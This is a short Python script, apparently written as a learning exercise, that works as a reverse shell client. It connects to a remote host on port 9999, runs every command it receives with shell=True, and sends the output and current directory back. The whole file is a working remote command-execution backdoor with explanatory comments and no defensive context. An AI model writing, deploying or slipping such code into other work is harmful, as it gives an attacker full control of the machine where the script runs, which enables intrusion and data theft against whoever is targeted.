import socket
import os
import subprocess

s = socket.socket()

# we don't have running server so now we use our computer as host and port number should same as server
host = '192.168.43.230'
port = 9999
s.connect((host,port))
# we want the connection as long as we want
while True:
    data = s.recv(1024)
    # after receiving the data packets from server we have to decode the data and check that the cmd is for any 'cd' cmd
    # or not if yes we don't need to return any thong just have to modify the directory
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0:
        # now we need a cmd to process our command 'Popen' open a new cmd 'shell' is True for shell commands and stdout,
        # stdin for standard input out from client and stderr for any error
        cmd = subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        # to display in clint computer
        output_byte = cmd.stdout.read() + cmd.stderr.read()  # iof combine both output any error if occur
        output_str = str(output_byte,'utf-8')  # string format of output_byte
        current_dir = os.getcwd() + '> '  # store the current working directory
        s.send(str.encode(output_str + current_dir)) # send the data to the server along with CWD
        print(output_str)
